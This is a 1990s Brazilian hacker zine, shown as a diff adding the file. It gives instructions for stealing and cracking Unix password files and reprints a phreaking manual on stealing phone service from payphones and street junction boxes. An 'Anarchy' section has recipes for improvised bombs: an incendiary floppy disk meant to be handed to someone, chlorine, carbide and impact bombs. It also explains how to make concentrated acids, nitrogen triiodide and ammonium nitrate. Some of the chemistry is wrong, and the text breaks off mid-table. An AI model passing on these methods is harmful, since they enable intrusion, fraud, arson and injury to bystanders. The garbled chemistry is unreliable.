@@ -1,0 +1,1743 @@
+
+Dark Sided 
+~~~~~~~~~
+
+By Cyber Cool
+		
+
+Dark Side Nº 0
+(Versão Beta)
+
+Introdução	
+
+	Depois de muito esforço, estou tentando lançar este zine para 
+Dark Side Hackers. Se o meu provedor não cancelar minha conta, pretendo 
+continuar com ele. Este Zine contém também partes de outros zines Hackers, que
+será especificado quando retirado do referido. Nesta versão beta eu irei 
+tentar colocar muitas dicas, já que não haverá nenhuma matéria concreta.
+
+				******* Enjoy ! *********
+
+Index
+~~~~~
+
+1 - Password do Unix
+2 - Phreaking
+3 - Anarchy
+4 - Vírus
+5 - Dicas 
+6 - FAQ (não é de minha autoria)
+6 - Como entrar em contato
+Password do Unix
+
+	Para poder pegar a senha dos usuários e do Super User é necessário entrar no sistema via ftp e pegar o arquivo passwd, que está no diretório /etc/. Daí ao abrir o arquivo você verá ele assim:
+
+username:password:UserID:GroupID:descrição ou nome:homedir:shell
+
+Ex.: Dark:teHDYSJS3d:0:3:Dark Sided:/:/bin
+
+Username: Dark
+Password encriptada: teHDYSJS3d
+User Number: 0
+Group User: 3
+Descrição: Dark Sided
+Homedir: /
+Shell: /bin
+
+	Agora se o arquivo estiver assim:
+Dark:x:0:3:Dark Sided:/:/bin
+
+	Você não é um cara de sorte. Vai ser muito difícil desencriptar a password porque o Unix está instalado no modo High. Mais se o arquivo estiver como no primeiro exemplo, você ainda terá chance de desencriptar o arquivo usando o crackjack e o directionary maker, ambos na nossa Home Page. O directionary maker serve para criar um arquivo de dicionário e o crackjack para tentar desencriptar a password.
+
+1º - Crie um dicionário com o directionary maker.
+2º - use o crackjack para desencriptografar o arquivo.
+	Ex.: jack password meudic.dic
+
+Depois disso você terá que esperar um longo tempo para que o crackjack termine de desencriptografar o arquivo.
+	Bem, isso é tudo que eu posso informar a vocês. Não vou informar nada explicadinho que é para não acostumar.
+
+Phreaking
+
+	Desta vez eu não tive tempo para fazer uma boa seção de phreaking, então eu resolvi colocar este manual de phreaking que eu peguei na net.
+
+Manual definitivo de violação a telefones públicos e privados
+
+
+		      +---------- Aviso ----------+
+
+
+Antes, aquele chavão de sempre: todos os procedimentos  descritos nesse docu-
+mento são ilegais e podem levar o infrator a cumprir penas de prisão e/ou pa-
+gamento de multas.
+Vale lembrar também que eu sou contra qualquer tipo de vandalismo, e que todo
+o processo aqui descrito não causa nenhum tipo de dano aos aparelhos  telefô-
+nicos. Mesmo a longo prazo.
+O cidadão idiota que copiar este documento, totalmente ou  em parte, sem avi-
+sar o autor, não passará de um lamer de primeira que  não faz porra nenhuma e
+tenta enganar os outros mas consegue enganar a si mesmo.
+Esse texto poderá ser mencionado em outros documentos, desde que  conste nes-
+ses de onde ele foi retirado e quem o escreveu (no caso, eu :-))
+
+
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+
+
++---------------------------------------------------------------------------+
+¦                                   Índice                                  ¦
++---------------------------------------------------------------------------+
+
+1   - Introdução
+1.1 - Prefácio da versão 1.1
+1.2 - Pobreza de informações e pessoas mal informadas
+1.3 - Conceitos básicos a respeito de telefonia
+
+2   - Telefones privados
+2.1 - Introdução
+2.2 - Efetuando ligações de aparelhos sem teclas
+
+3   - Telefones públicos
+3.1 - Introdução
+3.2 - Efetuando ligações gratuitamente utilizando um diodo
+3.3 - Efetuando ligações gratuitamente utilizando um aparelho comum
+3.4 - Conectando notebooks a telefones públicos
+3.5 - Observação
+
+4   - Caixas de verificação
+4.1 - Introdução
+4.2 - Efetuando ligações gratuitas de caixas de verificação
+
+5   - Pequena FAQ sobre telefonia
+5.1 - É possível tomar um choque mexendo em fios telefônicos?
+5.2 - Como faço para fazer chamadas grátis de minha residência?
+5.3 - O que é o BINA?
+5.4 - Existe alguma maneira de se bloquear o BINA?
+5.5 - As famosas "boxes" funcionam aqui no Brasil?
+
+6   - O Autor
+6.1 - PGP Key
+6.2 - Agradecimentos
+6.3 - Como contatar o autor
+
+
+
++---------------------------------------------------------------------------+
+¦                           Seção 1 - Introdução                            ¦
++---------------------------------------------------------------------------+
+
+
+1.1 - Prefácio da versão 1.1 ----+
+      
+      Depois de ter editado a primeira versão deste manual, recebi dezenas de
+mensagens, principalmento do pessoal do BHC (Brazilian Hackers Club), com vá-
+rias perguntas.  Algumas se  tornaram adendos e complemento para  as seções e
+outras eu levei para uma Mini-FAQ, que está localizada na seção 5.
+
+1.2 - Pobreza de informações e pessoas mal informadas  ----+
+
+      Ao me deparar  com alguns textos do  gênero,  sentia-me decepcionado ao
+perceber que eram incompletos e fracos, quando o assunto em questão era a te-
+lefonia.
+      É triste também perceber que pessoas mal informadas e  sem conhecimento
+técnico (embora tenham boa vontade), assinam estes textos. Faço aqui um tuto-
+rial com material bastante útil, que explica muitas coisas que podem ser fei-
+tas com a intenção de buscar um pouco de liberdade para se utilizar os siste-
+mas telefônicos.
+      Este texto também é destinado àqueles que se rasgam de ler  textos ame-
+ricanos de phreaking e boxing. Não importa o que fulano ouviu dizer que dava:
+o sistema telefônico nacional é completamente diferente do usado nos E.U.A. e
+não permite o "boxing". Ver maiores detalhes na seção 5.
+
+1.2 - Conceitos básicos a respeito de telefonia ----+
+
+      Ao contrário do que muita gente pensa, os fios da linha telefônica pos-
+suem uma tensão contínua equivalente a -48 volts.  Esta tensão se altera para
+um valor alternado de 96 volts quando o telefone toca. Portanto, ao lidar com
+os fios do telefone, tenha  o cuidado de não encostar  no orelhão, na parede,
+ou em qualquer coisa  que possa "aterrá-lo".  Este cuidado deve ser redobrado
+se o telefone for comunitário ou residencial. Levemos também  em consideração
+que se o aparelho possuí uma  tensão contínua,  significa que ele  tem também
+uma polarização correta (fio positivo e fio negativo).  Na instalação do apa-
+relho esta  polarização não faz diferença,  mas quando o  assunto é violação,
+ela deve ser observada.
+      Vamos lembrar também que existem dois tipos de linhas telefônicas:
+
+      A) Decádicas (ou Pulse) - são as  linhas  dos prefixos mais  antigos do
+sistema telefônico. A identificação de chamadas se dá através de uma série de
+sinais (pulsos), que são interpretados pela central telefônica.
+
+      B) Multifrequenciais (ou Tone) - são as linhas dos prefixos  mais novos
+onde trabalham o serviço de CPA (Central telefônica com controle por Programa
+Armazenado).  A identificação de  chamadas se dá através da  decodificação de
+tons frequenciais em números.
+
+
++---------------------------------------------------------------------------+
+¦                       Seção 2 - Telefones privados                        ¦
++---------------------------------------------------------------------------+
+
+
+2.1 - Introdução ----+
+
+      Nesta seção, explicarei o processo (bem simples) de se efetuar ligações
+a partir de telefones sem teclas ou com cadeado,  muito comuns  em empresas e
+ambientes de trabalho.
+
+2.2 - Efetuando ligações de aparelhos sem teclas ----+
+
+      Antes de começarmos, precisamos definir o  que significa "duração de um
+pulso". Um pulso é simplesmente uma interrupção no fluxo de corrente que cir-
+cula na linha telefônica, e a sua duração é entendida como  o espaço de tempo
+decorrido do início ao fim desta interrupção.
+      Os pulsos enviados pelo aparelho telefônico quando  você aperta o botão
+de algum número, são iguais ao sinal emitido quando você coloca o telefone no
+gancho. A diferenciação é feita pela central telefônica, usando como referên-
+cia a duração do pulso. Se ele for um pouco maior do que 0.5 segundos (aumen-
+tar um pouco esse valor para as linhas mais antigas), a central considera que
+é um pedido de linha.  Se a duração do pulso  for menor do que  esse valor, a
+central irá considerar que um número a ser discado está sendo enviado.
+      Para formar os números de 0 a 9, são enviado uma série de pequenos pul-
+sos em seqüência referentes ao número, ou seja,  2 pulsos  para o número 2, 3
+para o número 3 e assim por diante. Para o número 0 são enviados dez pulsos.
+      Para simular esses pulsos sem a necessidade de teclas, basta usar o bo-
+tão onde se "pega" a linha, aquele onde você coloca o  telefone em cima quan-
+do quer terminar uma ligação. Aperte e solte este botão rapidamente  de acor-
+do com o número que você quer discar, espere um pouco e aperte outra série de
+vezes de acordo com o outro número. Lembre-se que para o  número 0 deve-se a-
+pertar o botão dez vezes.
+	 Faça isso com todos os números e,  ao final, você  escutará o tom de
+chamada.
+
+
++---------------------------------------------------------------------------+
+¦                       Seção 3 - Telefones públicos                        ¦
++---------------------------------------------------------------------------+
+
+
+3.1 - Introdução ----+
+
+      Nesta seção explicaremos alguns métodos  de efetuar ligações com  tele-
+fones públicos sem a necessidade de se gastar fichas. Mostraremos também como
+ligar notebooks a telefones públicos  (se é que existe um hacker que não sai-
+ba...).
+
+3.2 - Efetuando ligações gratuitamente utilizando um diodo ----+
+
+      O diodo é um componente eletrônico que possui diversas utilizações. Po-
+demos resumir seu funcionamento basicamente na seguinte síntese:
+      Um diodo (ou junção PN),  permite que a corrente  circule em apenas uma
+direção dentro de um circuito.
+      Ao  se utilizá-lo para o fim aqui desejado,  vamos precisar de um diodo
+IN4002, IN4004 ou IN4007. Estes podem ser encontrados facilmente  em qualquer
+casa de componentes eletrônicos. Vamos precisar também de um resistor com va-
+lor nominal de 22K e potência de 1W.
+      Basta que você ligue o diodo em paralelo com o resistor (conforme tenta
+mostrar a ilustração abaixo) e,  em seguida, descasque os fios do  telefone e
+ligue cada uma das pontas obtidas com o diodo e o resistor neles.
+      Lembre-se: você vai apenas descascar os fios do orelhão!!! Se você cor-
+tá-los, ele vai ficar sem linha.
+		   
+
+				      ||
+				      ||     fio do telefone
+				      ||
+				      ||
+		   +------------------++-------------------+
+		   |                                       |
+		   |                                       |
+		   |           +----¦¦¦¦¦¦¦----+           |
+		   |          /      diodo      \          |
+	   ponta   +--------+                   +--------+   ponta
+		   |          \                 /          |
+		   |           +----¦¦¦¦¦¦¦----+           |
+		   |                resistor               |
+		   |                                       |
+		   +------------------++-------------------+
+				      ||
+				      ||     fio do telefone
+				      ||
+				      ||
+
+      
+      Para executar esta tarefa, eu aconselho que você  descasque os fios dos
+orelhões que você utiliza com mais freqüência pois,  devido ao fato  dos fios
+do telefone público serem muito grossos, não é um trabalho que se possa fazer
+tranqüila e rapidamente sem ser notado.
+      Você deverá observar também a polarização correta a ser utilizada.  Vo-
+cê perceberá isso facilmente pois, quando você ligar o diodo de maneira erra-
+da, o orelhão vai ficar sem linha.
+      Uma dica pessoal: os telefones de cabine e os de cartão são mais fáceis
+de serem violados. Alguns orelhões comuns tem uma proteção blindada que impe-
+dem o acesso ao cabo telefônico. Embora mesmo assim seja possível puxar o fio
+com um gancho, que você enfiará do lado esquerdo do aparelho telefônico,  en-
+tre o telefone e uma grade preta de sustentação que fica atrás dele, eu acon-
+selho que você evite esses tipos.
+      Vamos voltar um pouco para a parte técnica da coisa.
+      O diodo que estamos utilizando vai funcionar da seguinte maneira:
+      Quando uma ligação é completada de um  telefone público,  a central in-
+verte a polarização do telefone de -48 para 48 volts. Quando o aparelho tele-
+fônico percebe isso,  ele pede uma fixa.  É aí que entra  em funcionamento  o
+nosso querido diodo. Ele permite que a tensão caia até 0 volts, mas não  per-
+mite que ela se torne positiva. Dessa forma o orelhão não vai pedir a ficha.
+      Nesse caso o resistor está funcionando apenas como um dissipador de po-
+tência, para que você não dê o azar de queimar o diodo  (não que ele seja ca-
+ro, é que em algumas localidades ele pode ser uma peça rara que custa R$0,10)
+e ficar sem telefonar. Mesmo se você não achar nenhuma loja que venda,  pegue
+uma placa antiga de alguma coisa que tenha queimado.  Elas sempre tem diodos.
+Você deve procurar uma peça  pequinininha que tem  dois terminais,  é preta e
+normalmente estará escrito IN qualquer coisa.
+
+3.3 - Efetuando ligações gratuitamente utilizando um aparelho comum ----+
+
+      Primeiro, você deve tomar os processos citados anteriormente  para des-
+cascar os fios do telefone. Em seguida você deve  conseguir um aparelho tele-
+fônico comum e ligar cada uma das pontas dos fios dele nos fios do orelhão.
+      Para facilitar a sua  vida, eu aconselho que o seu telefone  seja o me-
+nor possível e que você prenda um jacaré  (pequeno gancho  achado em qualquer
+loja de componentes eletrônicos) em cada uma das pontas do seu telefone, para
+facilitar a ligação no orelhão.
+      Aí é só efetuar a ligação normalmente.
+
+3.4 - Conectando notebooks a telefones públicos ----+
+
+      O processo para se conectar notebooks a orelhões, é igual ao de se  co-
+nectar telefones comuns. Resumirei nesse item,  algumas considerações  a res-
+peito da fiação  do notebook,  que segue os  padrões da FCC  Americana e é um
+pouco diferente da nossa.
+      O conector do fio do notebook, que é do tipo jack, tem quatro fios den-
+tro dele. Arranque o conector de plástico  transparente  que fica na ponta do
+fio, pegue os dois fios centrais e separe-os dos fios das extremidades.
+      Estes dois fios centrais, são os que serão utilizados  para fazer a li-
+gação no orelhão. Eu aconselho que você coloque jacarés neles também.
+      Basta conectar-se a BBS's da mesma forma que você se conecta em casa.
+      Caso você queira testar se está tudo OK,  abra um programa de  terminal
+qualquer e digite o comando ATA, se fizer um barulhinho parecido com o tom de
+linha é que está tudo OK.
+
+3.5 - Observação ----+
+
+      As chamadas telefônicas se dividem em três categorias: locais,  DDD re-
+gionais e interurbanas (ou nacionais).
+      As chamadas locais são aquelas efetuadas dentro  de sua cidade,  as DDD
+regionais são as ligações feitas dentro do complexo urbano onde você mora, no
+caso de São Paulo, as chamadas DDD regionais são aquelas feitas para as cida-
+des que  fazem parte da Grande São Paulo: Jundiaí, Santo André, São Bernardo,
+etc. As chamadas interurbanas são aquelas feitas para fora do complexo urbano
+onde você está localizado. Usando São Paulo como exemplo, podemos citar o in-
+terior do estado de São Paulo e cidades localizadas em outros estados.
+      Os telefones comuns efetuam chamadas locais e DDD regionais, e os tele-
+fones DDD efetuam chamadas interurbanas, ou seja, para qualquer lugar do Bra-
+sil.
+
+
++---------------------------------------------------------------------------+
+¦                     Seção 4 - Caixas de verificação                       ¦
++---------------------------------------------------------------------------+
+
+
+4.1 - Introdução ----+
+
+      As caixas de verificação (ou armários na linguagem "técnica" da Telesp)
+são caixas de ferro, que geralmente ficam localizadas em vias públicas, e são
+utilizadas para se fazer a checagem das linhas do sistema e  identificar pro-
+blemas antes de se enfiar no subsolo para tentar resolvê-los.
+      Tais caixas costumam ser da cor cinza  e tem cerca de 1,5 m  de altura,
+com um código em preto escrito na parte superior.
+      Elas possuem um grande número de fios telefônicos, todos eles divididos
+em pares. Tais caixas podem ser facilmente abertas (se é que a que você achar
+já não estiver arrombada), pois geralmente possuem uma tranca padrão em forma
+de triângulo que qualquer chaveiro conhecido pode fazer.
+      Lembre-se que você é um hacker, não um vandalo. Não vá arrombar a porra
+da caixa. Isto é coisa pra quem não tem cérebro. Mesmo se ela estiver tranca-
+da com um cadiado. Se não puder abrir um cadiado ou procurar informação de um
+método para abrí-lo, procure outra caixa.  Ou então esqueça que você leu esta
+seção.
+
+4.2 - Efetuando ligações gratuitas de caixas de verificação ----+
+
+      Para se efetuar uma ligação de dentro destas caixas, basta que você pe-
+gue um dos diversos pares de fios que se encontram lá dentro e ligue  eles ao
+seu pequeno telefone comum portátil ou a um notebook.  Não esqueça de por  os
+fios que você tirou de volta no lugar para que, nem o pessoal da manutenção e
+nem o dono da linha, percebam.
+      Como essas caixas de verificação costumam se situar em  vias bem  movi-
+mentadas, a prática desse tipo de ligação é desaconselhada. Mas, como toda  a
+regra tem sua exceção, fica aqui mais uma informação para você.
+      Vale lembrar que de caixas de verificação, pode-se  efetuar telefonemas
+para qualquer lugar, inclusive chamadas internacionais.
+
+
++---------------------------------------------------------------------------+
+¦                   Seção 5 - Pequna FAQ sobre telefonia                    ¦
++---------------------------------------------------------------------------+
+
+
+5.1 - É possível tomar um choque mexendo em fios telefônicos? ----+
+      
+      Como descrito no item 1.3, os fios telefônicos possuem uma tensão sufi-
+ciente para dar choque relativamente forte em uma pessoa.  Este valor de ten-
+pode atingir um patamar em que ele pode dar um verdadeiro coice na pessoa, no
+momento em que a linha envia o sinal para o telefone tocar.
+      Isto depende muito da situação e da pessoa.  Se voce estiver com a  mão
+no orelhão e mexer nos fios, você provavelmente vai tomar um choque legal. Se      
+você tiver acabado de comer algo salgado, provavelmente este choque será ain-
+da mais forte, pois o sal aumente a condutividade do seu corpo.
+
+5.2 - Como faço para fazer chamadas grátis de minha residência? ----+
+
+      Quando você efetua uma chamada, a central telefônica identifica de onde
+você está discando, identifica  qual o tipo de telefone que  você está usando
+(público ou residencial), e então ela arquiva pra onde está senda feita a li-
+gação e toma as providências necessárias com relação a cobrança.
+      Essa identificação é feita na fonte e não por um sinal enviado pelo seu
+telefone. Desse modo, é praticamente impossível pra você que está  na sua re-
+sidência, tentar driblar essa tarifação. Imagine que sua linha telefônica não
+passa de um ramal de PABX.
+
+5.3 - O que é o BINA? ----+
+      
+      O BINA, é um sistema de identificação de chamadas desenvolvido com tec-
+nologia nacional, que permite  a quem está recebendo a chamada,  visualizar o
+número do telefone de quem está telefonando para ele.
+      O esquema teve que ser desenvolvido aqui no Brasil,  pois o sistema te-
+lefônico é tão arcaico, que não existiam pacotes prontos  para se adquirir. É 
+como você tentar comprar um Kit Multimídia para um TK-85 ou um MSX.
+      Tal sistema só funciona em linhas Decádicas,  portanto,  se você quiser
+passar um trote para alguém, procure se certificar  qual o tipo de linha  que
+ela possui. Para isso,  basta você dar uma olhada no  prefixo e ligar  para a
+sua  compania telefônica  local perguntando se  ele suporta CPA.  Se eles fa-
+larem que sim,  então pode ficar  tranqüilo e efetuar a  ligação que você não
+corre o risco de ser descoberto.
+      Mas tome cuidado com o que você vai fazer pois,  sob ordem judicial, as
+companias locais podem fornecer um rastreamento de chamadas e assim descobrir
+de onde você telefonou.
+
+5.4 - Existe alguma maneira de se bloquear o BINA? ----+
+
+      Da mesma maneira que a tarifação, o BINA não pode ser driblado do tele-
+fone que você está efetuando a chamada. Quem fornece o número  que vai apare-
+cer no aparelho do receptor, é enviado pela central telefônica e não pelo seu
+telefone.
+      Vale que acrescentar que o sistema não funciona perfeitamente bem e que
+às vezes não consegue identificar determinada chamada. Ele também não identi-      
+fica chamadas de telefones públicos.
+
+5.5 - As famosas "boxes" funcionam aqui no Brasil? ----+
+
+      Como se pode notar nesta seção, o sistema telefônica nacional, trabalha
+de maneira centralizada ao contrário do americano que trabalha  de forma dis-
+tribuída. E não é por acaso, pois, além  de possuirem um número bem  maior de
+linhas telefônicas, os serviços lá são privatizados e diversas companias ofe-
+recem linhas telefônicas.
+      A tarifação se dá por diversas identificações enviadas  pelos telefones
+e diversas centrais distribuidas pelo país. O que os "boxes" fazem, e driblar
+esses sinais enviando outros de diversas freqüenciais diferentes.
+      Por exemplo, você faz uma chamada internacional mas usa uma "box"  para
+enviar um sinal para a central de como esta chamada fosse uma chamada local.
+      Já de  telefones  públicos (quem já foi pra lá sabe disso),  depois que
+você efetua uma chamada, aparece novamente um tom de linha que fica aguardan-
+do o sinal do orelhão que diz que você pagou determinada taxa para o determi-
+nado serviço. Neste caso os "boxes" enviam os sinais no  lugar do orelhão e a
+chamada é completada. Esses tipos são conhecidos como Red Boxes, mas não fun-
+cionam em todos os telefones públicos.
+      Sem bem que, ultimamente,  as centrais telefônicas  estão sendo substi-
+tuídas por modelos mais novos. Isto  ocorre principalmente em São Paulo.  Mas
+caso  elas permitam o "boxing",  isto será um assunto para um  próxima versão
+desta FAQ.
+
+
++---------------------------------------------------------------------------+
+¦                            Seção 6 - O autor                              ¦
++---------------------------------------------------------------------------+
+
+
+6.1 - Agradecimentos ----+
+
+      Agradeço a todas aquelas pessoas que escreveram textos ruins sobre vio-
+lação de telefones e me estimularam a fazer um trabalho melhor elaborado.
+      Espero em breve  poder escrever uma FAQ sobre  telefonia celular, deta-
+lhando processos de escuta telefônica e mais algumas coisas.      
+      Obrigado ao pessoal do  Brazilian Hackers Club,  que mandaram perguntas
+que foram adicionadas a Seção 5.  Suas perguntas  ajudaram também a completar
+algumas seções.  Hackers do Brasil,  uni-vos contra o  preconceito e contra o
+vandalismo eletrônico.
+      Agradeço também a todos aqueles que contribuem para que haja uma  maior
+liberdade de expressão em todos os meios de comunicação, em especial, a nossa
+querida NET. Saudações também a todos aqueles que lutam por condições  melho-
+res de vida. Quem sabe um dia possamos viver em um mundo mais justo e com me-
+nos desigualdades sociais. Morte ao pensamento neoliberal.
+
+"Lutamos por um mundo melhor. Um mundo onde você possa ser feliz sem que isso
+implique na infelicidade do seu próximo"
+
+Marcos - Líder do Exército Zapatista de Libertação Nacional
+
+
+6.2 - PGP Key ----+
+
+Tipo Bits/IDChave  Data       Usuário (IDU)
+pub  1024/11E9A405 1996/12/21 Tom Waits <tom.waits@usa.net>
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6.3ia
+
+mQCNAzK7UwMAAAEEANQz27W9JQUVDYLxEGVX8l0An1tYLbbLXwEg6xBc9Y6/dcAa
+bn+Z5RbT5PrkySCVaLgePIfCKCzAEAkbAyCES7X2YNoHDD6Ea4AQn7TDWbP0Wprw
+xbJErRuuE1G+WquDa/nPSmsrZw+h29Ec3AR/G3/WW/95FD8yybLjR4gR6aQFAAUR
+tB1Ub20gV2FpdHMgPHRvbS53YWl0c0B1c2EubmV0PokAlQMFEDK7UwOy40eIEemk
+BQEByRIEAKPvqZAEEk6oyZXyfs82gc/Lt4cBNonFm1CBph4w/JqX7QkkSibD7PUW
+ewsTxht6ESsJbDWsT0st7bU9UfLJFqfeOMq5NH4q8gpJQFFG9IBUx/PrZxeOAwpa
+SWIfUGt/cfOHn0gurh1AgktS5NyXOeRL5QDw0x3O/XKNY/Pv03KV
+=+Fdu
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+6.3 - Como contatar o autor ----+
+
+      Para esclarecimentos ou correções, mande-me um e-mail ou procure-me  no
+Brazilian Hackers Club. Uma associação mantida da livre iniciativa de um cara
+muito dedicado que atende por Liquid Byte.
+      Terei prazer em responder a perguntas inteligentes, não sou fresco como
+alguns membros da comunidade...
+      Dependendo do que você  for perguntar, isto é,  coisas comprometedoras,
+use o PGP. Tenha bom senso. Se você fizer perguntas idiotas, receberá respos-
+tas cretinas.
+
+e-mail: tom.waits@usa.net
+LiquidByte home-page (Brazilian Hackers Club)
+http://www.geocities.com/SiliconValley/Heights/6152/
+
+Free Speech!!!
+Rage Against The Machine.
+
+Anarchy
+
+	Como eu já tinha dito, estou sem tempo, mas na próxima edição eu coloco uma seção mais completa.
+
+ARMA DE SOPRO
+
+Para a arma você precisa de:
+
+* Um cano de aproximadamente 0.7 mm de diâmetro.
+
+Para os dardos você precisa de:
+
+* Um lápis com a borracha;
+* Um alfinete ou agulha de costura;
+* Lã;
+* Fita adesiva.
+
+Instruções:
+
+	Retire a borrachinha com o metal do lápis. Recorte uns pedacinhos de 2 cm de lã e prenda com a fita adesiva no fundo do alfinete. Deixe o fundo do alfinete bem grosso com bastante fita. Enfie o alfinete na borracha pelo lado do metal. Force bem para que a parte com fita prenda na borrachinha.
+	
+	Para atirar, coloque dardo dentro do cano e assopre.
+
+O autor não é responsável pelos atos de seus leitores. Corra seus próprios riscos.
+
+DISQUETE-BOMBA
+
+
+Você precisa de:
+
+* 1 ou mais discos de 3.5 polegadas;
+* Uma caixa de fósforo, azul ou branco SOMENTE!;
+* Um estilete bem afiado;
+* Um frasco de cimento plástico ou argamassa;
+* Um centímetro de magnésio em tiras (opcional);
+* Uma grama de termite. Mistura de alumínio pulverizado e óxido de ferro, 
+     usada na produção do aço (opcional).
+
+Instruções:
+
+	Abra cuidadosamente o diquete. Com o disco aberto você tem que escolher entre arrancar a proteção onde fica a marca do disco (normalmente de metal), ou deixar ela no lugar. Se a proteção for arrancada, a bomba vai ficar visível e você mesmo terá de colocá-la no drive. Se a proteção ficar no lugar, você pode dar o disco para um "amigo". Raspe a cabeça dos fósforos e amasse para que vire um pó. Retire o pano do disquete e cubra um ou ambos os lados do disco com a argamassa. Espalhe o pó dos fósforos em cima e deixe secar. Feche o disco colando os cantos e pronto!
+	Se você quiser um estrago maior, coloque a tira de magnésio em cima do pó dos fósforos. Se você quiser destruir o computador, coloque o termite em baixo do magnésio.
+
+Funcionamento:
+
+	Quando o disco for acessado o pó dos fósforos irá atritar e acender. O disco vai derreter e se espalhar pelo drive. Se você usou o magnésio, o calor gerado pelos fósforos vai acender a tira. O magnésio vai queimar destruindo o drive permanentemente e, com sorte, outras coisas mais que estiverem por perto. Se você usou o magnésio e o termite juntos, o magnésio irá acender o termite e ele vai começar a agir. O termite vai queimar o disco, o drive, o gabinete, a mesa, o chão e vai pingar em algum lugar perto do Japão.
+
+O autor não é responsável pelos atos de seus leitores. Corra seus próprios riscos.
+
+BOMBA DE CLORO
+
+Você precisa de:
+
+* Cloro (com Hipocloreto de Sódio);
+* Água;
+* Açúcar;
+* Uma garrafa de dois litros.
+
+Instruções:
+
+	Misture o cloro, a água e o açúcar em partes iguais. Encha mais ou menos 1/10 da garrafa com a mistura. Deixe no chão e corra.
+
+Funcionamento:
+
+	As substâncias reagem e soltam gases. A pressão dentro da garrafa aumenta e ela explode.
+
+BOMBA DE CARBONETO
+
+Você precisa de:
+
+* Carboneto de Cálcio;
+* Um pote de vidro com tampa;
+* Água.
+
+Instruções:
+
+	Encha o vidro com água. Coloque o Carboneto de Cálcio no vidro e tampe. Deixe no chão e saia correndo. Corra MESMO !! Esse tipo de bomba é muito perigoso.
+
+Carboneto de Cálcio pode ser encontrado facilmente em qualquer loja de construção.
+
+Funcionamento:
+
+	O Carboneto vai reagir com a água e formar um gás inflamável chamado Carbonato de Acetileno. A pressão no pote de vidro irá aumentar e o pote irá estourar.
+	Se você quiser um maior estrago, deixe um pedaço de pano queimando por perto. O vidro estoura, o Acetileno atinge a chama e explode formando uma bola de fogo.
+
+BOMBA DE FUMAÇA
+
+Você precisa de:
+
+* Açúcar;
+* Nitrato de Potássio;
+* Um pote com boca larga.
+
+Instruções:
+
+	Junte 4 partes de açúcar com 6 partes de Nitrato de Potássio numa panela. Esquente em fogo baixo e mexa bem até derreter tudo. Coloque a mistura no pote e, antes de solidificar, jogue alguns fósforos para funcionar como pavio.
+
+Funcionamento:
+
+	O fósforo queima e acende a mistura. Acontecem reações químicas e a fumaça é liberada.
+
+O autor não é responsável pelos atos de seus leitores. Corra seus próprios riscos.
+
+BOMBA DE IMPACTO
+
+Você precisa de:
+
+* Uma bola de gude;
+* Pólvora;
+* Um saco plástico;
+* Linha ou barbante.
+
+Instruções:
+
+	Recorte um pedaçinho do plástico que seja suficiente para embrulhar a bola de gude. Coloque um pouco de pólvora em cima do plástico, a bola em cima da pólvora e embrulhe-a com o plástico. Amarre a ponta com o barbante, fazendo com que fique bem firme para a pólvora não sair. Para detonar, jogue a bomba em alguma superfície dura.
+
+Funcionamento:
+
+	Quando a bomba bate na superfície dura, a bola de gude espreme a pólvora fazendo com que estoure. A explosão é bem forte mesmo com pouca pólvora, então tome cuidado pois a bola é espatifada e voam pedaços de vidro por todos os lados.
+
+	Em estádios de futebol foram encontradas bombas com bolas de sinuca em vez de bolas de gude. Invente você sua bomba (só não vá usar bolas de boliche!!).
+
+O autor não é responsável pelos atos de seus leitores. Corra seus próprios riscos.
+
+FAZENDO SUBSTÂNCIAS DE DIFÍCIL ACESSO
+
+ÁCIDO SULFÚRICO CONCENTRADO
+
+Você precisa de:
+
+* Ácido de bateria (comprado em qualquer loja automotiva);
+* Uma panela de vidro.
+
+Instruções:
+
+	Coloque o ácido na panela de vidro e ferva até aparecer uma fumaça branca. Quando essa fumaça branca aparecer, apague o fogo e guarde o Ácido Sulfúrico Concentrado em um pote de vidro com uma tampa hermetica.
+
+
+NITRATO DE POTÁSSIO
+
+Você precisa de:
+
+* Pólvora comum;
+* Água;
+* Um coador (de café serve);
+* Uma panela.
+
+Instruções:
+
+	Dissolva a pólvora numa panela com água fervente. Mexa por uns instantes. Coe a solução com um coador por diversas vezes até a solução ficar transparente. O que ficar no coador é carvão e enxofre e pode ser descartado. A solução, depois de coada, apresenta o Nitrato de Potássio dissolvido em água. Deixe a água evaporar e está pronto.
+
+ÁCIDO NÍTRICO CONCENTRADO
+
+Você precisa de:
+
+* Nitrato de Potássio;
+* Água destilada;
+* Ácido Sulfúrico concentrado;
+* Fogão;
+* Uma Retorta (um pote com o gargalo entortado para baixo);
+* Um tubo de ensaio;
+* Um recipiente com gelo;
+* Uma vareta para agitar a solução.
+
+Instruções:
+
+	Coloque 32 milímetros de ácido sulfúrico concentrado na retorta. Junte 68 gramas (BEM PESADAS) de nitrato de potássio e agite cuidadosamente até dissolver tudo. Coloque o tubo de ensaio no recipiente com de gelo e leve até a boca da retorta. Comece então a esquentar a retorta. A solução irá evaporar e seguir pelo gargalo até o tubo de ensaio. Com o frio do tubo, ela condensará e você tem o Ácido Nítrico Cocentrado. Continue a operação até acabar toda a solução na retorta e guarde o ácido num pote de vidro com tampa.
+
+CRISTAIS DE TRIÓXIDO DE AMÔNIA
+
+Você precisa de:
+
+* Cristais de Iodo;
+* Amônia (transparente);
+* Funil;
+* Filtro de Papel;
+* Papel Toalha;
+* Duas jarras de vidro velhas;
+
+Instruções:
+
+	Coloque duas coleres-de-chá de iodo em uma das garrafas. Vá despejando amônia até cobrir o iodo. Colque o filtro no funil e o funil na outra garrafa. Deixe o iodo encharcar um pouco na amônia e depois despeje-o no funil. Retire o funil e espalhe as pedrinhas formadas no papel toalha para secar ao sol. Essa substância tem uma vida útil de aproximadamente 1 semana, portanto não estoque ou guarde.
+
+NITRATO DE AMÔNIA
+
+Você precisa de:
+
+* Um frasco de boca larga;
+* Uma bacia com gelo;
+* Ácido Nítrico;
+* Amônia.
+
+Instruções:
+
+	Faça isso num lugar aberto e bem ventilado pois são exalados gases tóxicos. Encha o frasco com Ácido Nítrico e coloque-o na bacia com gelo. Despeje a amônia no frasco e saia de perto. Irão ocorrer reações e uma grande liberação de gases. Por volta de meia depois, retire o frasco do gelo e deixe-o no sol para secar. O pó que se formará é Nitrato de Amônia. Guarde em um pote hermeticamente fechado pois este tipo de substância tende a absorver água do ar.
+
+TABELA DE EQUIVALÊNCIA
+
+
+Nome - Inglês			Nome - Português			Equivalente
